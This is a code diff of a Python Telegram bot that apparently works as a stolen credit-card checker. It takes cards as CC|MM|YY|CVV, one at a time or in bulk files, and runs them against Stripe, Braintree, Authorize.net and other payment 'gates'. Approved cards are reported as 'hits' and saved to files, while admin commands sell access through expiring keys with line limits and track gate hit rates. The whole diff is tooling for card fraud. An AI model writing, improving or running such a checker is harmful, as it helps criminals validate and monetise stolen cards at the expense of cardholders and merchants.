+            f"Detail: <code>{detail}</code>\n"
+            f"Latency: <code>{latency}ms</code>\n"
+            f"Currently: {enabled_label}\n\n"
+            f"{action_text}",
+            reply_markup=buttons)
         return
 
-    # --- /chkapis ---
+    # --- /chkapis — Check ALL gates at once (admin only) ---
     if text == "/chkapis":
         if not is_admin(user_id):
-            return
-        resp = send_message(chat_id, "<b>🛡️ Probing all gates...</b>")
-        probe_msg_id = resp.get("result", {}).get("message_id")
-
-        lines = ["<b>🛡️ Health Report</b>\n"]
+            return  # Silent
+        send_message(chat_id, "<b>🔍 Checking all gates...</b>\nThis may take a moment.")
+        lines_out = [f"<b>🛡️ API Health Report</b>\n{'─' * 28}\n"]
+        any_dead = []
         for gate_key, info in GATE_PROBE_MAP.items():
             alive, latency, detail = probe_gate(gate_key)
             enabled = is_gate_enabled(gate_key)
-            icon = "🟢" if alive else "🔴"
-            en = "On" if enabled else "Off"
-            status = f"{latency}ms" if alive else detail[:40]
-            lines.append(f"{icon} <b>{info['name']}</b>\n   {status}  ·  {en}")
+            if alive:
+                icon = "🟢"
+                status = f"Alive ({latency}ms)"
+            else:
+                icon = "🔴"
+                status = f"Dead — {detail}"
+                any_dead.append(gate_key)
+            en_icon = "✅" if enabled else "⛔"
+            lines_out.append(f"{icon} <code>{info['cmd']}</code> — {info['name']}\n    {status} | {en_icon} {'On' if enabled else 'Off'}")
 
-        if probe_msg_id:
-            edit_message(chat_id, probe_msg_id, "\n".join(lines), reply_markup=back_main_kb())
+        if any_dead:
+            lines_out.append(f"\n⚠️ <b>{len(any_dead)} dead gate(s)</b> — use individual /chkapi* to disable")
+        else:
+            lines_out.append(f"\n✅ <b>All gates operational</b>")
+
+        lines_out.append(FOOTER)
+        send_message(chat_id, "\n".join(lines_out))
         return
 
-    # --- /genkey ---
+    # --- /gates ---
+    if text == "/gates":
+        GATE_REGISTRY = [
+            ("auth", "/auth", "Stripe Auth (Dilaboards)", True),
+            ("b3", "/b3", "Braintree Auth", True),
+            ("b3auth", "/b3auth", "Braintree Auth (Session)", True),
+            ("authnet", "/authnet", "Authorize.net", True),
+            ("autosho", "/autosho", "Shopify Auto 🔜 Soon", False),
+            ("st1", "/st1", "HiAPI Check3", True),
+            ("st5", "/st5", "HiAPI Check", True),
+        ]
+        gs = load_gate_stats()
+        lines_out = ["<b>Available Gates</b>\n"]
+        for key, cmd, label, live in GATE_REGISTRY:
+            enabled = is_gate_enabled(key)
+            if not live:
+                status_icon = "🔴"
+                status_text = "Soon"
+            elif not enabled:
+                status_icon = "⛔"
+                status_text = "Disabled"
+            else:
+                status_icon = "🟢"
+                status_text = "Live"
+            s = gs.get(key, {})
+            total = s.get("total", 0)
+            approved = s.get("approved", 0)
+            rate = round((approved / total) * 100, 1) if total > 0 else 0
+            lines_out.append(
+                f"{status_icon} <code>{cmd}</code> — {label}\n"
+                f"    {status_text} | {total} checked | {approved} hits | {rate}% rate"
+            )
+        lines_out.append(FOOTER)
+        send_message(chat_id, "\n".join(lines_out))
+        return
+
+    # --- /stats ---
+    if text == "/stats":
+        send_message(chat_id, fmt_stats(user_id))
+        return
+
+    # --- /mykey ---
+    if text == "/mykey":
+        send_message(chat_id, fmt_mykey(user_id))
+        return
+
+
+    # --- /genkey (below) ---
+
+    # --- /genkey (admin) — /genkey <limit> <duration> ---
     if text.startswith("/genkey") and not text.startswith("/genkeys"):
         if not is_admin(user_id):
-            send_message(chat_id, "<b>Admin only.</b>")
+            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
             return
+
+        # Parse: /genkey <limit> <duration>
         parts = text.split()
         line_limit = None
         duration_seconds = None
+
         if len(parts) >= 2:
+            # First arg could be a number (limit) or duration
             try:
                 line_limit = int(parts[1])
+                # Second arg is duration if present
                 if len(parts) >= 3:
                     parsed = parse_duration(parts[2])
                     if parsed == -1:
-                        send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm")
+                        send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm" + FOOTER)
                         return
                     duration_seconds = parsed
             except ValueError:
+                # First arg is duration, no limit
                 parsed = parse_duration(parts[1])
                 if parsed == -1:
-                    send_message(chat_id,
-                        "<b>🔑 Generate Key</b>\n\n"
-                        "Usage: <code>/genkey [limit] [duration]</code>\n"
-                        "Examples: /genkey 500 7d, /genkey 7d, /genkey")
+                    send_message(chat_id, "<b>Usage:</b> <code>/genkey [limit] [duration]</code>\nExamples: /genkey 500 7d, /genkey 7d, /genkey" + FOOTER)
                     return
                 duration_seconds = parsed
 
@@ -2179,51 +2038,46 @@ def handle_update(update):
 
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
         limit_label = str(line_limit) if line_limit else "Unlimited"
-        send_message(chat_id,
-            f"<b>🔑 Key Generated</b>\n\n"
-            f"<code>{key}</code>\n\n"
-            f"Duration  <code>{dur_label}</code>\n"
-            f"Limit  <code>{limit_label}</code>",
-            reply_markup=back_main_kb())
+        send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>{FOOTER}")
         return
 
-    # --- /genkeys ---
+    # --- /genkeys <count> <limit> <duration> (admin) — bulk key generation ---
     if text.startswith("/genkeys"):
         if not is_admin(user_id):
-            send_message(chat_id, "<b>Admin only.</b>")
+            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
             return
+
         parts = text.split()
         if len(parts) < 2:
-            send_message(chat_id,
-                "<b>🔑 Bulk Generate</b>\n\n"
-                "Usage: <code>/genkeys 10 500 7d</code>\n\n"
-                "  count — how many keys\n"
-                "  limit — max lines (optional)\n"
-                "  duration — expiry (optional)")
+            send_message(chat_id, "<b>Usage:</b> <code>/genkeys 10 500 7d</code>\n\n  count — how many keys\n  limit — max lines per file (optional)\n  duration — key expiry (optional)" + FOOTER)
             return
+
         try:
             count = int(parts[1])
         except ValueError:
-            send_message(chat_id, "<b>Invalid count.</b>")
+            send_message(chat_id, "<b>Invalid count.</b> Must be a number." + FOOTER)
             return
+
         if count < 1 or count > 500:
-            send_message(chat_id, "<b>Count must be 1–500.</b>")
+            send_message(chat_id, "<b>Count must be 1-500.</b>" + FOOTER)
             return
+
         line_limit = None
         duration_seconds = None
+
         if len(parts) >= 3:
             try:
                 line_limit = int(parts[2])
                 if len(parts) >= 4:
                     parsed = parse_duration(parts[3])
                     if parsed == -1:
-                        send_message(chat_id, "<b>Invalid duration.</b>")
+                        send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm" + FOOTER)
                         return
                     duration_seconds = parsed
             except ValueError:
                 parsed = parse_duration(parts[2])
                 if parsed == -1:
-                    send_message(chat_id, "<b>Invalid format.</b>")
+                    send_message(chat_id, "<b>Invalid format.</b>\nUsage: <code>/genkeys 10 500 7d</code>" + FOOTER)
                     return
                 duration_seconds = parsed
 
@@ -2250,64 +2104,69 @@ def handle_update(update):
             for k in generated:
                 f.write(k + "\n")
         send_document(chat_id, filepath, filename,
-            caption=f"<b>🔑 {count} Keys Generated</b>\nDuration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>")
+            caption=f"<b>{count} Keys Generated</b>\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>{FOOTER}")
         return
 
-    # --- /revoke ---
+    # --- /revoke <user_id> (admin) ---
     if text.startswith("/revoke"):
         if not is_admin(user_id):
-            send_message(chat_id, "<b>Admin only.</b>")
+            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
             return
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, "<b>🚫 Revoke</b>\n\nUsage: <code>/revoke 123456789</code>")
+            send_message(chat_id, "<b>Usage:</b> <code>/revoke 123456789</code>" + FOOTER)
             return
         target_id = parts[1].strip()
         users = load_users()
         if target_id in users:
             del users[target_id]
             save_users(users)
-            send_message(chat_id,
-                f"<b>🚫 Access Revoked</b>\n\n<code>{target_id}</code>",
-                reply_markup=back_main_kb())
+            send_message(chat_id, f"<b>Access Revoked</b>\n\nUser <code>{target_id}</code> has been removed." + FOOTER)
         else:
-            send_message(chat_id, f"<b>User not found.</b>\n\n<code>{target_id}</code>")
+            send_message(chat_id, f"<b>User not found.</b>\n\n<code>{target_id}</code> is not authorized." + FOOTER)
         return
 
-    # --- /authlist ---
+    # --- /authlist (admin) ---
     if text == "/authlist":
         if not is_admin(user_id):
-            send_message(chat_id, "<b>Admin only.</b>")
+            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
             return
         users = load_users()
         if not users:
-            send_message(chat_id, "<b>📋 No authorized users.</b>", reply_markup=back_main_kb())
+            send_message(chat_id, "<b>No authorized users.</b>" + FOOTER)
             return
-        lines = []
+
+        lines_out = []
         now = time.time()
         for uid, entry in users.items():
             key = entry.get("key", "N/A")
             expires_at = entry.get("expires_at")
             if expires_at is None:
-                exp = "Perm"
+                exp = "Permanent"
             elif now > expires_at:
-                exp = "Expired"
+                exp = "EXPIRED"
             else:
-                exp = fmt_duration(int(expires_at - now))
-            lines.append(f"<code>{uid}</code>  {key[:10]}…  {exp}")
-        send_message(chat_id,
-            f"<b>📋 Authorized Users ({len(users)})</b>\n\n" + "\n".join(lines),
-            reply_markup=back_main_kb())
+                remaining = int(expires_at - now)
+                exp = fmt_duration(remaining) + " left"
+            lines_out.append(f"  {uid} | {key[:10]}... | {exp}")
+
+        msg_text = (
+            f"<b>Authorized Users ({len(users)})</b>\n"
+            f"{'─' * 28}\n\n"
+            "<code>" + "\n".join(lines_out) + "</code>"
+            + FOOTER
+        )
+        send_message(chat_id, msg_text)
         return
 
-    # --- /broadcast ---
+    # --- /broadcast (admin) ---
     if text.startswith("/broadcast"):
         if not is_admin(user_id):
-            send_message(chat_id, "<b>Admin only.</b>")
+            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
             return
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, "<b>📢 Broadcast</b>\n\nUsage: <code>/broadcast Your message</code>")
+            send_message(chat_id, "<b>Usage:</b> /broadcast Your message here" + FOOTER)
             return
         broadcast_text = parts[1]
         users = load_users()
@@ -2315,36 +2174,29 @@ def handle_update(update):
         failed = 0
         for uid in users:
             try:
-                resp = send_message(int(uid), f"<b>📢 Broadcast</b>\n\n{broadcast_text}")
+                resp = send_message(int(uid), f"<b>Broadcast</b>\n\n{broadcast_text}{FOOTER}")
                 if resp.get("ok"):
                     sent += 1
                 else:
                     failed += 1
             except Exception:
                 failed += 1
-        send_message(chat_id,
-            f"<b>📢 Broadcast Complete</b>\n\n"
-            f"Sent  <code>{sent}</code>\n"
-            f"Failed  <code>{failed}</code>",
-            reply_markup=back_main_kb())
+        send_message(chat_id, f"<b>Broadcast Complete</b>\n\nSent: <code>{sent}</code>\nFailed: <code>{failed}</code>{FOOTER}")
         return
 
     # --- /redeem ---
     if text.startswith("/redeem"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id,
-                "<b>🔑 Redeem</b>\n\n"
-                "Usage: <code>/redeem YOUR-KEY</code>",
-                reply_markup=back_main_kb())
+            send_message(chat_id, "<b>Usage:</b> <code>/redeem YOUR-KEY</code>" + FOOTER)
             return
         key = parts[1].strip()
         keys = load_keys()
         if key not in keys:
-            send_message(chat_id, "<b>Invalid key.</b>")
+            send_message(chat_id, "<b>Invalid key.</b>" + FOOTER)
             return
         if keys[key].get("used"):
-            send_message(chat_id, "<b>Key already used.</b>")
+            send_message(chat_id, "<b>Key already used.</b>" + FOOTER)
             return
         keys[key]["used"] = True
         keys[key]["used_by"] = user_id
@@ -2356,45 +2208,37 @@ def handle_update(update):
 
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
         limit_label = str(line_limit) if line_limit else "Unlimited"
-        adm = is_admin(user_id)
-        send_message(chat_id,
-            f"<b>✅ Access Granted</b>\n\n"
-            f"Duration  <code>{dur_label}</code>\n"
-            f"Limit  <code>{limit_label}</code>\n\n"
-            f"Welcome aboard!",
-            reply_markup=main_menu_kb(adm))
+        send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>\nWelcome aboard.{FOOTER}")
         return
 
-    # --- Gate commands: /auth, /b3, /b3auth, /authnet, /autosho, /st1, /st5 ---
+    # --- Gate commands: /auth, /st1, /st5 (single card OR bulk file) ---
+    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/b3": ("b3", "Braintree Auth"), "/b3auth": ("b3auth", "Braintree Auth (Session)"), "/authnet": ("authnet", "Authorize.net"), "/autosho": ("autosho", "Shopify Auto"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
     cmd_base = text.split()[0] if text else ""
     if cmd_base in gate_map:
         gate, gate_label = gate_map[cmd_base]
 
+        # Check if gate is disabled
         if not is_gate_enabled(gate):
             send_message(chat_id,
                 f"<b>⛔ {gate_label} — Offline</b>\n\n"
-                f"This gate has been disabled.\n"
-                f"Try another gate.",
-                reply_markup=gates_menu_kb())
+                f"This gate has been disabled by an admin.\n"
+                f"Try another gate or check /gates for available options." + FOOTER)
             return
 
         if not is_authorized(user_id):
-            send_message(chat_id, fmt_unauthorized(), reply_markup=back_main_kb())
+            send_message(chat_id, fmt_unauthorized())
             return
 
-        # --- SINGLE CARD MODE ---
+        # --- SINGLE CARD MODE: /auth 4111...|01|25|123 ---
         parts = text.split(maxsplit=1)
         if len(parts) == 2 and '|' in parts[1]:
             cc_input = parts[1].strip()
             c_data = cc_input.split('|')
             if len(c_data) != 4:
-                send_message(chat_id,
-                    "<b>Invalid format.</b>\n\n"
-                    f"Use: <code>{cmd_base} CC|MM|YY|CVV</code>")
+                send_message(chat_id, "<b>Invalid format.</b>\n\nUse: <code>/auth CC|MM|YY|CVV</code>" + FOOTER)
                 return
 
-            resp = send_message(chat_id, f"<b>🔍 Checking...</b>\n\n<code>{cc_input}</code>")
-            check_msg_id = resp.get("result", {}).get("message_id")
+            send_message(chat_id, f"<b>🔍 Checking...</b>\n<code>{cc_input}</code>")
 
             def _single_check():
                 result = process_single_entry(cc_input, [], user_id, gate=gate)
@@ -2405,47 +2249,42 @@ def handle_update(update):
                 elif "skipped" in r_lower:
                     icon = "⏭️"
                     status = "SKIPPED"
-                elif "error" in r_lower:
+                elif "error" in r_lower or "⚠️" in result:
                     icon = "⚠️"
                     status = "ERROR"
                 else:
                     icon = "❌"
                     status = "DECLINED"
 
-                msg_text = (
-                    f"<b>{icon} {status}</b>\n\n"
-                    f"Card  <code>{cc_input}</code>\n"
-                    f"Gate  <code>{gate_label}</code>\n\n"
-                    f"{result}"
-                )
-
-                if check_msg_id:
-                    edit_message(chat_id, check_msg_id, msg_text, reply_markup=back_main_kb())
-                else:
-                    send_message(chat_id, msg_text, reply_markup=back_main_kb())
+                send_message(chat_id,
+                    f"<b>{icon} {status}</b>\n"
+                    f"{'─' * 28}\n\n"
+                    f"Card: <code>{cc_input}</code>\n"
+                    f"Gate: <code>{gate_label}</code>\n"
+                    f"Result: {result}"
+                    + FOOTER)
 
             threading.Thread(target=_single_check, daemon=True).start()
             return
 
-        # --- BULK MODE ---
+        # --- BULK MODE: reply to .txt file ---
         reply = msg.get("reply_to_message")
         if not reply or not reply.get("document"):
             send_message(chat_id,
-                f"<b>📝 {gate_label}</b>\n\n"
-                f"Single: <code>{cmd_base} CC|MM|YY|CVV</code>\n"
-                f"Bulk: Reply to a .txt file with <code>{cmd_base}</code>",
-                reply_markup=back_main_kb())
+                f"<b>Usage:</b>\n"
+                f"  Single: <code>{cmd_base} CC|MM|YY|CVV</code>\n"
+                f"  Bulk: Reply to a .txt file with <code>{cmd_base}</code>" + FOOTER)
             return
 
         doc = reply["document"]
         fname = doc.get("file_name", "")
         if not fname.lower().endswith(".txt"):
-            send_message(chat_id, "<b>Only .txt files accepted.</b>")
+            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
             return
 
         with active_lock:
             if user_id in active_users:
-                send_message(chat_id, "<b>You already have a task running.</b>")
+                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
                 return
             active_users.add(user_id)
 
@@ -2455,29 +2294,27 @@ def handle_update(update):
         if not content:
             with active_lock:
                 active_users.discard(user_id)
-            send_message(chat_id, "<b>Failed to download file.</b>")
+            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
             return
 
         lines = [l.strip() for l in content.splitlines() if l.strip()]
         if not lines:
             with active_lock:
                 active_users.discard(user_id)
-            send_message(chat_id, "<b>File is empty.</b>")
+            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
             return
 
+        # Enforce line limit from key
         user_limit = get_user_line_limit(user_id)
         if user_limit and len(lines) > user_limit:
             with active_lock:
                 active_users.discard(user_id)
-            send_message(chat_id,
-                f"<b>File Too Large</b>\n\n"
-                f"Your key allows <code>{user_limit}</code> lines.\n"
-                f"Your file has <code>{len(lines)}</code> lines.")
+            send_message(chat_id, f"<b>File Too Large</b>\n\nYour key allows <code>{user_limit}</code> lines.\nYour file has <code>{len(lines)}</code> lines." + FOOTER)
             return
 
         init_resp = send_message(
             chat_id,
-            f"<b>⚡ Starting — {gate_label}</b>",
+            f"Starting Engine — <b>{gate_label}</b>...",
             reply_markup=stop_button_markup(user_id)
         )
         progress_msg_id = init_resp.get("result", {}).get("message_id")
@@ -2496,13 +2333,16 @@ def handle_update(update):
                 else:
                     status_text = "ERROR — " + detail
 
+                # Instant hit notification — send immediately on approval
                 if status == "APPROVED":
                     send_message(
                         chat_id,
-                        f"<b>✅ HIT</b>\n\n"
+                        f"<b>HIT FOUND</b>\n"
+                        f"{'─' * 28}\n\n"
                         f"<code>{entry}</code>\n\n"
-                        f"{detail}\n\n"
-                        f"<code>[{idx}/{total}]</code>"
+                        f"{detail}\n"
+                        f"{'─' * 28}\n"
+                        f"  [{idx}/{total}]"
                     )
 
                 now = time.time()
@@ -2531,7 +2371,7 @@ def handle_update(update):
                         )
                     )
 
-                send_message(chat_id, fmt_results(results), reply_markup=back_main_kb())
+                send_message(chat_id, fmt_results(results))
 
                 if results["approved_list"]:
                     filename = f"approved_{int(time.time())}.txt"
